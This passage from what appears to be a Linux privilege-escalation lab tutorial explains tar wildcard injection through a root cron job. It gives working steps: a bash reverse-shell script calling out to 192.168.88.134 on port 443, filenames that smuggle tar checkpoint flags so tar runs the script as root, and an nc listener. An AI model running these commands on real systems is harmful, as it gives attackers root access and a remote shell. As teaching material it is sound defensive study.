## Exploitation Method 5: Wildcard Injection via Cron

WHY tar interprets filenames as flags:

The shell expands `*` before tar even runs. So `tar czf backup.tar.gz *` becomes `tar czf backup.tar.gz shell.sh --checkpoint=1 --checkpoint-action=exec=bash shell.sh`. Tar processes the filenames as if they were command-line arguments — it cannot tell the difference. `--checkpoint=1` prints a status message every 1 record processed. `--checkpoint-action=exec=bash shell.sh` runs a command at each checkpoint. Together: on the first record, tar executes your shell.

**Scenario:** A root cron job runs `tar` or `rsync` with a wildcard in a directory you can write to.

chmod 777 /var/backups

Give everyone write access to the `/var/backups` directory (this simulates the misconfiguration):

**Vulnerable crontab entry:**


**Step 1: Confirm cron entry**

`cat /etc/crontab`

![](https://miro.medium.com/v2/resize:fit:700/1*Y6G_fFMKX3C6YZvOkXCsrw.png)

/etc/crontab showing the vulnerable tar wildcard cron job — * expands to all files in /var/backups

# 2. Prove the directory is writable by your user  
```
ls -ld /var/backups
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*EwXtM3PagZ2TsDC9hcFtAQ.png)

drwxrwxrwx confirms /var/backups is world-writable — we can create files here

**Step 2: Create malicious files in the target directory**

cd /var/backups  
  
# 1. Create the reverse shell script  
echo '/bin/bash -i >& /dev/tcp/192.168.88.134/443 0>&1' > shell.sh  
chmod +x shell.sh  
  
# 2. Create the malicious wildcard files  
echo "" > "--checkpoint=1"  
echo "" > "--checkpoint-action=exec=bash shell.sh"  
  
# 3. List the directory to show the files  
ls -la

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*EdD8MRuXQDWpzG21NI-fdw.png)

The injected files: shell.sh (payload), `**--**`checkpoint=1 and `**--**` checkpoint-action=exec=bash shell.sh (argument injection via filename)

`echo "" > "--checkpoint=1"`**:** _The_ `_>_` _creates a file. The filename is literally_ `_--checkpoint=1_`_. The_ `_echo ""_` _writes an empty line into it — the content doesn't matter, only the filename does._

Notice the filenames `--checkpoint=1` and `--checkpoint-action=exec=bash shell.sh` in the directory listing. When tar expands `*`, these filenames become arguments.

When tar runs, `*` expands to: `shell.sh --checkpoint=1 --checkpoint-action=exec=bash shell.sh`. Tar interprets the filenames as flags and executes `bash shell.sh` as root.

**Step 3: Catch the shell**

rlwrap nc -lvnp 443

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*M-LFkcOkwZMcvro8S-WHhg.png)

Root shell from wildcard injection — tar executed our shell.sh via — checkpoint-action